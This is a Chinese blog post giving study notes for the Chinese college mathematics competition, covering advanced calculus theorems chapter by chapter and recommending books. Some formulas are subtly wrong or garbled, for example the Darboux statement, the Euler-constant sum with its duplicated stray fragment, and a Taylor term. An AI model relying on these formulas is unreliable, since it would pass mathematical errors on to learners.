<p>在打好基础的情况下，也就是你对微积分掌握了绝大部分，但是CMC或者考研会要求更多一点点，在此处，鼠鼠将会详细列出正常课程中没有的内容，也就是俗称<strong>DLC</strong></p> <p>下面🐹🐹按照浦和平的《大学生数学竞赛教程》的目录来进行扩展<strong>进阶</strong>的知识点，注意是<strong>进阶</strong>，所以课内一些基础的、简单的我不会提及。</p> <p>涉及的是扩展内容，不是本体内容。也就是<strong>额外内容(DLC)</strong></p> <p>对于食用DLC，本🐹🐹的建议是结合辅导书，<strong>根据DLC内容进行练习，而不是死记知识点</strong>。</p> <h3 id="1️⃣第一章-函数极限连续">1️⃣第一章 函数、极限、连续</h3> <h4 id="cauchy极限存在准则">🌟<strong>Cauchy极限存在准则</strong></h4> <p>数列 \(x_n\) 收敛的充分必要条件是：</p> <p>对于任意给定的正数 \(\epsilon\) ,存在正整数 \({N}\) ,使得当 \(m&gt;N,n&gt;N\) 时，有 \(\|x_n-x_m|&lt;\epsilon\)</p> <h4 id="cauchy极限公式">🌟<strong>Cauchy极限公式</strong></h4> <p>若 \(\lim\limits_{n\rightarrow\infty}a_n=A\) ,则 \(\lim\limits_{n\rightarrow\infty}{\frac{a_1+a_2+...+a_n}{n}}=A\)</p> <h4 id="奥特曼法">🌟<strong>奥特曼法</strong></h4> <p>百度贴吧流传已久的一种求极限方法，其本质是“抓大头”，也就是变化最快的一个。数学语言描述如下：</p> \[\lim\limits_{n\rightarrow\infty}{\sqrt[n]{a^n+b^n+c^n}}=max{\\{a,b,c\\}}\] <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-12-13/outman-480.webp 480w,/assets/img/2022-12-13/outman-800.webp 800w,/assets/img/2022-12-13/outman-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-12-13/outman.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h4 id="stolz定理">🌟<strong>Stolz定理</strong></h4> <p>俗称数列的L’Hospital定理</p> <p>(1) 定理一( \(\frac{*}{\infty}\) 型)</p> <p>设数列 \(a_n,b_n\) 满足:</p> <p>\(b_n\) 严格单调递增</p> <p>且 \(\lim\limits_{n\rightarrow\infty}{b_n}=+\infty\)</p> <p>那么,有 \(\lim\limits_{n\rightarrow\infty}{\frac{a_n}{b_n}}={\lim\limits_{n\rightarrow\infty}\frac{a_{n+1}-a_n}{b_{n+1}-b_n}}=L,\) 其中 \(L\) 可以是有限数、 \(+\infty\) 、 \(-\infty\)</p> <p>(2) 定理二 ( \(\frac{0}{0}\) 型)</p> <p>设数列 \(a_n,b_n\) 满足:</p> <p>\(b_n\) 严格单调递减且趋于零</p> <p>且 \(\lim\limits_{n\rightarrow\infty}{a_n}=0\)</p> <p>那么,有 \(\lim\limits_{n\rightarrow\infty}{\frac{a_n}{b_n}}={\lim\limits_{n\rightarrow\infty}\frac{a_{n+1}-a_n}{b_{n+1}-b_n}}=L,\) 其中 \(L\) 可以是有限数、 \(+\infty\)、 \(-\infty\)</p> <h4 id="中值定理求极限的方法">🌟<strong>中值定理求极限的方法</strong></h4> <p>首先要先掌握一些中值定理，详见第三章DLC。</p> <p>这个只能结合例题来说明；</p> <p>例如，求极限 \(\lim\limits_{x\rightarrow3}\frac{\sin{x^x}-\sin{3^x}}{3^{x^x}-3^{3^x}}\)</p> <p>解: \(\lim\limits_{x\rightarrow3}\frac{\sin{x^x}-\sin{3^x}}{3^{x^x}-3^{3^x}}=\lim\limits_{x\rightarrow3}\frac{\cos{\xi}}{3^\xi\ln 3}\) ,其中 \(\xi\) 介于 \(x^x\) 和 \(3^x\) 之间，</p> <p>所以 \(\lim\limits_{x\rightarrow3}\frac{\sin{x^x}-\sin{3^x}}{3^{x^x}-3^{3^x}}=\lim\limits_{x\rightarrow3}\frac{\cos{\xi}}{3^\xi\ln 3}=\frac{\cos9}{3^9\ln 3}\)</p> <h4 id="stirling公式">🌟<strong>Stirling公式</strong></h4> <p>斯特林公式(Stirling公式)</p> <blockquote> <p>用一坨答辩来逼近 \(n!\)</p> </blockquote> \[\lim\limits_{n\rightarrow\infty}{\frac{e^nn!}{n^n\sqrt{n}}}=\sqrt{2\pi}\] <p>比较少数的CMC题目可以直接用这个公式。</p> <h4 id="无穷大量的比较">🌟<strong>无穷大量的比较</strong></h4> <p>如果学过算法分析，理解起来很容易，其实就是时间复杂度的比较。</p> <p>当 \(n\rightarrow+\infty\) 时，有</p> <p>\(\ln n\) \(&lt;\) \(n^{\alpha}\) \(&lt;\) \(n^{\beta}\) \(&lt;\) \(a^n\) \(&lt;\) \(n!\) \(&lt;\) \(n^n\)</p> \[(0&lt;\alpha&lt;\beta, a&gt;1)\] <p>所以可以直接有：</p> \[\lim\limits_{n\rightarrow\infty}{\frac{n!}{n^n}}=0\] <h4 id="darboux定理">🌟<strong>Darboux定理</strong></h4> <p>\(f(x)\) 的导函数 \(f'(x)\) 在 \([a,b]\) 上不一定连续，</p> <p>若 \(f'(x)=\alpha\) , \(f'(x)=\beta\) ,则 \(\exists\xi\in(a,b)\) 使 \(f'(\xi)\) 介于 \(\alpha,\beta\) 之间</p> <h4 id="一致连续的定义">🌟<strong>一致连续的定义</strong></h4> <p>了解即可。</p> <p>对于任意 \(\epsilon&gt;0\) , \(\exists\delta&gt;0\) 使得对于任意 \(x_1,x_2\in I\) 当满足 \(\|x_1-x_2|&lt;\delta\) 时，有 \(\|f(x_1)-f(x_2)|&lt;\epsilon\) 恒成立，则该函数在区间 \(I\) 上一致连续。</p> <h4 id="lipschitz条件">🌟<strong>Lipschitz条件</strong></h4> <p>了解即可。</p> <p>对于在实数集子集的函数 \(f:D\subseteq R\) ,若 \(\exists\) 常数 \(k\) 对于任意 \(a,b\in D\) 使得 \(\|f(a)-f(b)|\le k\|a-b|\) ,则称 \(f\) 符合Lipschitz条件， \(k_{min}\) 为Lipschitz常数，符合Lipschitz条件的 \(f\) 必然一致连续，反之不一定。</p> <h3 id="2️⃣第二章-一元函数微分学">2️⃣第二章 一元函数微分学</h3> <h4 id="凑导数定义">🌟<strong>凑导数定义</strong></h4> <p>经常需要最原始的导数的定义来解决问题，所以虽然是很基础的内容，但是这里特地提一嘴。</p> \[f'(x_0)=\lim\limits_{x\rightarrow x_0}\frac{f(x)-f(x_0)}{x-x_0}\] <p>或者</p> \[f'(x_0)=\lim\limits_{\Delta x\rightarrow 0}\frac{f(x_0+\Delta x)-f(x_0)}{\Delta x}\] <h4 id="leibniz公式">🌟<strong>Leibniz公式</strong></h4> <p>非常常见的求高阶导数的公式，使用频率很高。</p> \[(f(n)\cdot g(n))^{(n)}=\sum C_n^i f^{(i)}(x)\cdot g^{(n-i)}(x)\] <h3 id="3️⃣第三章-一元函数积分学">3️⃣第三章 一元函数积分学</h3> <h4 id="区间再现公式">🌟<strong>区间再现公式</strong></h4> <p>1.有 \(\int_{a}^{b}f(x)dx=\int_{a}^{b}f(a+b-x)dx\)</p> <p>2.若 \(f(x)\) 关于 \(x=\frac{a+b}{2}\) 对称，则 \(\int_{a}^{b}xf(x)dx=\frac{a+b}{2}\int_{a}^{b}f(x)dx\)</p> <p>特例，也是常见的公式：</p> \[\int_{0}^{\pi}xf(sinx)dx=\frac{\pi}{2}\int_{0}^{\pi}f(sinx)dx\] <h4 id="wallis公式">🌟<strong>Wallis公式</strong></h4> <p>俗称点火公式/华莱士公式。</p> <p>当 \(n\) 为偶数时，</p> \[\int_{0}^{\frac{\pi}{2}}sin^nxdx=\int_{0}^{\frac{\pi}{2}}cos^nxdx=\frac{n-1}{n}\frac{n-3}{n-2}......\frac{3}{4}\frac{1}{2}\frac{\pi}{2}\] <p>当 \(n\) 为奇数时，</p> \[\int_{0}^{\frac{\pi}{2}}sin^nxdx=\int_{0}^{\frac{\pi}{2}}cos^nxdx=\frac{n-1}{n}\frac{n-3}{n-2}......\frac{2}{3}\] <h4 id="三角函数有关的积分公式">🌟<strong>三角函数有关的积分公式</strong></h4> <p>除了区间再现和Wallis公式之外，还有一些小的积分公式。</p> <p>此外，要常常想起<strong>和差半倍</strong>的一些公式，有利于积分，以及一些分部积分的技巧。</p> <p><strong>公式1</strong>：</p> \[\int_{0}^{\frac{\pi}{2}}f(\sin x)dx=\int_{0}^{\frac{\pi}{2}}f(\cos x)dx\] <p>证明1：</p> <p>令 \(x=\frac{\pi}{2}-t\) ，剩下的你来。</p> <p><strong>公式2</strong>:</p> \[\int_{0}^{\pi}xf(\sin x)dx=\frac{\pi}{2}\int_{0}^{\pi}f(\sin x)dx\] <p>证明2：</p> <p>令 \(x=\pi-t\) ，剩下的你来。</p> <h4 id="积分中值定理">🌟<strong>积分中值定理</strong></h4> <p><strong>积分第一中值定理</strong></p> <p>若 \(f(x)\) 在闭区间 \([a,b]\) 上连续， \(g(x)\) 在 \([a,b]\) 不变号，且 \(g(x)\) 在 \([a,b]\) 上是可积的，则在 \([a,b]\) 上至少存在一个点 \(\epsilon\) ,使得：</p> \[\int_{a}^{b}f(x)g(x)dx=f(\epsilon)\int_{a}^{b}g(x)dx\] <h4 id="组合积分法">🌟<strong>组合积分法</strong></h4> <p>这种积分的方法真要说，可以出一本书来讲。</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-12-13/zuhejifen-480.webp 480w,/assets/img/2022-12-13/zuhejifen-800.webp 800w,/assets/img/2022-12-13/zuhejifen-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-12-13/zuhejifen.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>不过这里介绍的只是一点点皮毛，主要思路是,观察所求积分的特点，再利用对称的积分或者一些已知的积分，然后用不定积分的加减法来得到线性方程，再接着解方程，从而求得一些复杂积分的解。</p> <p>经典的例子：</p> <p>求积分 \(\int{\frac{\sin x}{\sin x+\cos x}}dx\)</p> <p>解： 记所求积分为 \(I=\int{\frac{\sin x}{\sin x+\cos x}}dx\)</p> <p>考虑另外一个积分 \(J=\int{\frac{\cos x}{\sin x+\cos x}}dx\)</p> <p>则有 \(I+J=\int{\frac{\sin x+\cos x}{\sin x+\cos x}}dx=\int dx=x+C\)</p> <p>又因为 \(J-I=\int{\frac{\cos x-\sin x}{\sin x+\cos x}}dx=\int{\frac{1}{\sin x+\cos x}}d{(\cos x+\sin x)}=\ln{\|\sin x+\cos x|}+C\)</p> <p>上述俩个式子相减，得到 \(2I=x+\ln{\|\sin x+\cos x|}+C\)</p> <p>则 \(I=\frac{x}{2}+\frac{1}{2} \ln{\|\sin x+\cos x|}+C\)</p> <p>更多内容，详见各教辅或其他工具书。</p> <h4 id="积分形式cauchy-schwarz不等式">🌟<strong>积分形式Cauchy-Schwarz不等式</strong></h4> \[(\int f(x)g(x)dx)^2 \le \int f^2(x)dx \cdot \int g^2(x)dx\] <h3 id="4️⃣第四章-多元函数微分学">4️⃣第四章 多元函数微分学</h3> <h4 id="偏导数与连续的关系">🌟<strong>偏导数与连续的关系</strong></h4> <p>按照同济教材的内容，一般都是</p> <p>俩个偏导数在点 \((x,y)\) 存在且连续，则可以推出函数在该点可微。</p> <p><strong>但是</strong>，实际上，只需要一个偏导数存在(不一定连续)，另一个偏导数存在且连续,则可以推出函数在该点可微。</p> <h4 id="二元函数taylor展开">🌟<strong>二元函数Taylor展开</strong></h4> <p>首先引入记号：</p> <p>\((h\frac{\partial }{\partial x}+k\frac{\partial}{\partial y})f(x_0,y_0)\) 表示 \(hf_x(x_0,y_0)+kf_y(x_0,y_0)\)</p> <p>同样的，</p> <p>\((h\frac{\partial }{\partial x}+k\frac{\partial}{\partial y})^2f(x_0,y_0)\) 表示 \(h^2f_{xx}(x_0,y_0)+2hkf_{xy}(x_0,y_0)+k^2f_{xy}(x_0,y_0)\)</p> <p>更一般地，</p> <p>\((h\frac{\partial }{\partial x}+k\frac{\partial}{\partial y})^{m}f(x_0,y_0)\) 表示</p> \[\sum_{p=0}^{m}C_{m}^{p}h^pk^{m-p}\frac{\partial ^mf}{\partial x^p\partial y^{m-p}}|_{(x_0,y_0)}\] <p>设 \(z=f(x,y)\) 在点 \((x_0,y_0)\) 的某一邻域内有直到 \(n+1\) 阶连续偏导数， \((x_0+h,y_0+k)\) 为此邻域内任一点，则有</p> \[f(x_0+h,y_0+k)=f(x_0,y_0)+(h\frac{\partial}{\partial x}+k\frac{\partial}{\partial y})f(x_0,y_0)+\frac{1}{2!}(h\frac{\partial}{\partial x}+k\frac{\partial}{\partial y})^2f(x_0,y_0)+...+\frac{1}{n!}(h\frac{\partial}{\partial x}+k\frac{\partial}{\partial y})^nf(x_0,y_0)+R_n\] <p>其中， \(R_n=\frac{1}{(n+1)!}(h\frac{\partial}{\partial x}+k\frac{\partial}{\partial y})^{n+1}f(x_0+\theta h,y_0+\theta k)\)</p> <p>其中， \((0 \lt \theta \lt 1)\)</p> <p>这就是 \(f\) 在点 \((x_0,y_0)\) 的 \(n\) 阶泰勒展开公式，其中 \(R_n\) 被称为拉格朗日余项。</p> <h3 id="5️⃣第五章-多元数量值函数积分学">5️⃣第五章 多元数量值函数积分学</h3> <h4 id="二重积分的和式极限">🌟<strong>二重积分的和式极限</strong></h4> <p>请类比一元积分的定义，这部分将很好理解。</p> <p>下面用例题来说明；</p> <p><strong>大绿书第五章例3</strong>：</p> <p>计算 \(\lim\limits_{n\rightarrow\infty}\sum_{i=1}^{n}\sum_{j=1}^{2n}{\frac{2}{n^2}[\frac{2i+j}{n}]}\) ,这里 \([x]\) 是不超过 \(x\) 的最大整数.</p> <p>解：</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-12-13/ecjfhsjx-480.webp 480w,/assets/img/2022-12-13/ecjfhsjx-800.webp 800w,/assets/img/2022-12-13/ecjfhsjx-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-12-13/ecjfhsjx.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-12-13/ecjfhsjx2-480.webp 480w,/assets/img/2022-12-13/ecjfhsjx2-800.webp 800w,/assets/img/2022-12-13/ecjfhsjx2-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-12-13/ecjfhsjx2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h4 id="雅可比行列式">🌟<strong>雅可比行列式</strong></h4> <p>重积分换元的必经之路，<strong>雅可比(Jacobi)行列式</strong>。</p> <p>看懂下面的部分需要线性代数基础,并且我只针对下面需要用到的的换元公式来说明该部分，详情请自行查阅、搜索。</p> <p>直观上说，雅可比行列式表示 \(xOy\) 平面上的面积微元和换元后的 \(uOv\) 平面上的面积微元的比值。</p> <p>设 \(x=x(u,v),y=y(u,v)\)</p> <p>则Jacobi行列式</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-12-13/Jacobi1-480.webp 480w,/assets/img/2022-12-13/Jacobi1-800.webp 800w,/assets/img/2022-12-13/Jacobi1-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-12-13/Jacobi1.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>则有 \(dxdy=|J|dudv\)</p> <p>注意<strong>一定要加绝对值</strong>。</p> <h4 id="二重积分的换元公式">🌟<strong>二重积分的换元公式</strong></h4> <p>下面介绍一般的二重积分换元公式</p> <p>结合上述的Jacobi行列式，换元变得迎刃而解。</p> <p>作换元 \(x=x(u,v),y=y(u,v)\)</p> <p>则 \(\iint_{D}f(x,y)dxdy=\iint_{D'}f[x(u,v),y(u,v)]\cdot {|J|}dudv\)</p> <p>注意<strong>一定要加绝对值</strong>。</p> <p>具体能怎么运用呢？实际上可以参考<strong>大绿书第五章例9的方法2</strong></p> <p>它这题方法2实际上是线性变换，可以参考线性代数里面的线性变换.</p> <h4 id="二重积分的极坐标换元">🌟<strong>二重积分的极坐标换元</strong></h4> <p>一般换元公式的特例之一。</p> <p>只需要将具体的换元代入即可。</p> <p>作换元 \(x=r\cos \theta,y=r\sin \theta\)</p> <p>于是</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-12-13/Jacobi2-480.webp 480w,/assets/img/2022-12-13/Jacobi2-800.webp 800w,/assets/img/2022-12-13/Jacobi2-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-12-13/Jacobi2.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>则有 \(dxdy=rdrd\theta\)</p> <p>现在知道极坐标换元的面积微元怎么来的吧~</p> <p>注意<strong>一定要加绝对值</strong>。</p> <h4 id="二重积分的球面坐标换元">🌟<strong>二重积分的球面坐标换元</strong></h4> <p>一般换元公式的特例之一。</p> <h4 id="二重积分的分部积分公式">🌟<strong>二重积分的分部积分公式</strong></h4> <p>把格林(Green)公式中被积函数换成俩函数乘积即可推出二重积分的分部积分公式。</p> \[\iint_{\Omega}f\frac{\partial g}{\partial x}dxdy=\oint_{\partial \Omega}(f\cdot g)dy-\iint_{\Omega}g\frac{\partial f}{\partial x}dxdy\] \[\iint_{\Omega}f\frac{\partial g}{\partial y}dxdy=-\oint_{\partial \Omega}(f\cdot g)dx-\iint_{\Omega}g\frac{\partial f}{\partial y}dxdy\] <h4 id="三重积分换元公式">🌟<strong>三重积分换元公式</strong></h4> <p>类比于二重积分换元公式。</p> <h4 id="三重积分柱面坐标换元">🌟<strong>三重积分柱面坐标换元</strong></h4> <p>类比于二重积分柱面坐标换元。</p> <h4 id="三重积分球面坐标换元">🌟<strong>三重积分球面坐标换元</strong></h4> <p>类比于二重积分球面坐标换元。</p> <h3 id="6️⃣第六章-多元向量值函数积分学">6️⃣第六章 多元向量值函数积分学</h3> <p>其实第六章内容不多，无非就是前面的积分整一整，再多几个向量形式的积分公式而已。</p> <h4 id="green公式">🌟<strong>Green公式</strong></h4> <p>课内已有，不再赘述。</p> <h4 id="stokes公式">🌟<strong>Stokes公式</strong></h4> <p>课内已有，不再赘述。</p> <h4 id="gauss公式">🌟<strong>Gauss公式</strong></h4> <p>课内已有，不再赘述。</p> <h3 id="7️⃣第七章-常微分方程">7️⃣第七章 常微分方程</h3> <p>人类对微分方程的研究其实不多，很多微分方程人类都是解不出来的，所以CMC应该不会出太难的微分方程的题目。</p> <p>这部分DLC不多。</p> <h4 id="可化为齐次方程的微分方程">🌟<strong>可化为齐次方程的微分方程</strong></h4> <h4 id="bernoulli方程">🌟<strong>Bernoulli方程</strong></h4> <p>形如 \(y'+P(x)y=Q(x)y^n\) 的微分方程</p> <p>俩边同时除 \(y^n\) 即可得到</p> \[y^{-n}\frac{dy}{dx}+P(x)y^{1-n}=Q(x)\] <p>之后再换元 \(z=y^{1-n}\)</p> <p>解关于 \(z\) 的一阶线性微分方程即可。</p> <h4 id="euler方程">🌟<strong>Euler方程</strong></h4> <p>以二阶的微分方程为例子（n阶同理）:</p> <p>对于方程 \(x^2y''+pxy'+qy=f(x)\)</p> <p>作变量代换 \(x=e^t\) 或 \(t=\ln x\) ，方程化为二阶常系数线性微分方程</p> \[D(D-1)y+pDy+qy=f(e^t)\] <p>其中， \(D=\frac{d}{dt}\)</p> <h4 id="liouville公式">🌟<strong>Liouville公式</strong></h4> <p>对于二阶线性齐次微分方程</p> \[y''+p(x)y'+q(x)y=0\] <p>已知一个特解 \(y_1\) ,则另一个线性无关的特解为 \(\)y_2=y_1\int{\frac{1}{y_1^2}e^{-\int{p(x)dx}}}dx\(\)</p> <p>证明：</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-12-13/liouvilleproof-480.webp 480w,/assets/img/2022-12-13/liouvilleproof-800.webp 800w,/assets/img/2022-12-13/liouvilleproof-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-12-13/liouvilleproof.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h4 id="常数变易法">🌟<strong>常数变易法</strong></h4> <p>第十三届CMC初赛中，大题第三题可以直接用常数变易法解方程，然后再判断有界性，相比给出的奇技淫巧，更为简单粗暴，可以直接求得答案。</p> <p>比如常数变易法求二阶线性方程 \(y''+py'+qy=f(x)\) 的步骤：</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-12-13/csbyf-480.webp 480w,/assets/img/2022-12-13/csbyf-800.webp 800w,/assets/img/2022-12-13/csbyf-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-12-13/csbyf.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h3 id="8️⃣第八章-无穷级数">8️⃣第八章 无穷级数</h3> <h4 id="euler常数">🌟<strong>Euler常数</strong></h4> <p>了解即可，一个发散级数带来的常数。</p> \[\sum_{i=1}^{\infty} \frac{1}{n}=\ln n+ \gamma\] <p>其中， \(\gamma \approx 0.57721 56649\) 为欧拉常数。</p> <p>换句话说，</p> \[\sum_{i=1}^{\infty} \frac{1}{n}-\ln n= \gamma\] \[(0&lt;\alpha&lt;\beta, a&gt;1)\] <p>所以可以直接有：</p> \[\lim\limits_{n\rightarrow\infty}{\frac{n!}{n^n}}=0\] <h4 id="拉链定理">🌟<strong>拉链定理</strong></h4> <p>其实这个点也可以放在第一章里面。</p> <p>数列收敛的<strong>充要条件</strong>是其奇、偶子数列收敛于同一极限。</p> <h4 id="cauchy乘积">🌟<strong>Cauchy乘积</strong></h4> <p>也叫做俩数列的离散卷积。</p> <p>Cauchy乘积的定义为：</p> <p>对于俩个级数 \(\sum_{n=0}^{\infty}a_n\) 和 \(\sum_{n=0}^{\infty}b_n\) ,不论其敛散性，其Cauchy乘积为:</p> \[(\sum_{n=0}^{\infty}a_n)\cdot(\sum_{n=0}^{\infty}b_n)=\sum_{n=0}^{\infty}(\sum_{m=0}^{n}a_mb_{n-m})\] <h4 id="cauchy收敛定理">🌟<strong>Cauchy收敛定理</strong></h4> <p>若 \(\sum_{n=0}^{\infty}a_n\) 和 \(\sum_{n=0}^{\infty}b_n\) 绝对收敛，且 \(\sum_{n=0}^{\infty}a_n=A\) , \(\sum_{n=0}^{\infty}b_n=B\) 则其<strong>柯西乘积</strong>绝对收敛，且收敛到 \(A\cdot B\)</p> <p>也就是说， \((\sum_{n=0}^{\infty}a_n)\cdot(\sum_{n=0}^{\infty}b_n)=\sum_{n=0}^{\infty}(\sum_{m=0}^{n}a_mb_{n-m})=A\cdot B\)</p> <h4 id="weierstrass准则">🌟<strong>Weierstrass准则</strong></h4> <p>若存在一个收敛的正项级数 \(\sum_{n=1}^{\infty}M_n\) ，对任意 \(n\in N_{+}\) 以及任意 \(x\in I\) ，恒有 \(|u_n(x) \le M_n|\) 则级数 \(\sum_{n=1}^{\infty}u_n(x)\) 在 \(I\) 上一致收敛。</p> <h4 id="parseval恒等式">🌟<strong>Parseval恒等式</strong></h4> <p>设 \(f(x)\) 是 \([0,2\pi]\) 上的分段连续函数，且 \(f(x)~\frac{a_0}{2}+\sum_{n=1}^{\infty}(a_n \cos {nx}+b_n \sin {nx})\) 则有 \(\frac{1}{\pi}\int_{0}^{2\pi}(f(x))^2dx=\frac{a_0^2}{2}+\sum_{n=1}^{\infty}(a_n^2+b_n^2)\)</p> <h2 id="第三步开始速通真题">第三步：开始速通真题</h2> <p>参考资料库或者其他各种渠道的真题即可。</p> <p><strong>速通建议</strong>：配合本文DLC的知识点，再利用“大绿书”做相应知识点的练习。</p> <p>在完成大部分DLC知识点的巩固后，可以进一步直接做真题，参考资料库中往年的真题汇总和解析即可。</p> <p>这部分大概耗时1个月就可以了，如果想要得到一等奖或者决赛入场券，可以适当延长练习时间，更广泛巩固DLC知识点和本体知识点。</p> <h1 id="资料库">资料库</h1> <p>资料库包含<strong>部分电子版推荐书籍</strong>，<strong>往届真题</strong>，<strong>🐹🐹的笔记</strong>。</p> <p>均上传到了本库中的<strong>source</strong>文件夹中。</p> <h2 id="推荐书籍">推荐书籍</h2> <p><strong>1.数学分析习题集-吉米多维奇著</strong></p> <p>俗称就是吉米多维奇习题集。</p> <p><strong>非常不建议全部做一遍，因为非常多，会耗费大量时间。</strong>（鼠鼠的个人观点）</p> <p>可以偶尔翻两下。</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-12-13/jmdwq-480.webp 480w,/assets/img/2022-12-13/jmdwq-800.webp 800w,/assets/img/2022-12-13/jmdwq-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-12-13/jmdwq.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p><strong>2.大学生数学竞赛教程-蒲和平著</strong></p> <p>俗称大绿书，鼠鼠当初只用了这一本书，推荐指数🌟🌟🌟</p> <p>对着🐹🐹总结的DLC，做对应知识点的练习题足以速通。</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-12-13/sxjsjc-480.webp 480w,/assets/img/2022-12-13/sxjsjc-800.webp 800w,/assets/img/2022-12-13/sxjsjc-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-12-13/sxjsjc.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p><strong>3.大学生数学竞赛习题精讲-陈兆斗著</strong></p> <p>没做过，听说还不错。鼠鼠就只用过大绿书，比鼠鼠努力且有时间的可以试试这本。</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-12-13/chenzhaodou-480.webp 480w,/assets/img/2022-12-13/chenzhaodou-800.webp 800w,/assets/img/2022-12-13/chenzhaodou-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-12-13/chenzhaodou.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p><strong>4.普林斯顿微积分读本</strong></p> <p>略读过，感觉有点cjb了，就是辅导差生学好微积分而已，个人觉得用处不大。</p> <p>因为如果你能在系统的学习下掌握知识，那么这种书对你来说就是鸡肋。</p> <p>推荐的原因是，如果你是小白，那么这本书还是不错的。</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-12-13/plsd-480.webp 480w,/assets/img/2022-12-13/plsd-800.webp 800w,/assets/img/2022-12-13/plsd-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-12-13/plsd.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p><strong>5.数学女孩系列</strong></p> <p>神中神，🐹🐹高中时期午休时光的精神食粮，对我来说附带青春buff，而且里面很多数学科普知识跨度很大，从幼儿园到人类前沿，漫游各个领域的数学知识，属于提升素养方面的书籍。</p> <p>放在本速通教程中纯属是🐹🐹个人推荐，对速通CMC或许有着无用之用的用处。</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2022-12-13/mathgirl-480.webp 480w,/assets/img/2022-12-13/mathgirl-800.webp 800w,/assets/img/2022-12-13/mathgirl-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2022-12-13/mathgirl.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h2 id="往届真题">往届真题</h2> <p>截止到目前鼠鼠更新本库，一共进行了十四届CMC。</p> <h3 id="初赛">初赛</h3> <p>初赛的题目都是只包含高等数学的内容，考试大纲请参考<a href="http://www.cmathc.cn/">官方网站</a>。</p> <p>资料库索引：</p> <blockquote> <p>sources/真题</p> </blockquote> <h3 id="决赛">决赛</h3> <p>决赛的题目除了包含80%的高等数学内容外，还包含20%的线性代数内容。</p> <p>由于🐹🐹在更新本文时，并不清楚自己是否进入了决赛名单(很有可能没有),所以这部分内容不多。</p> 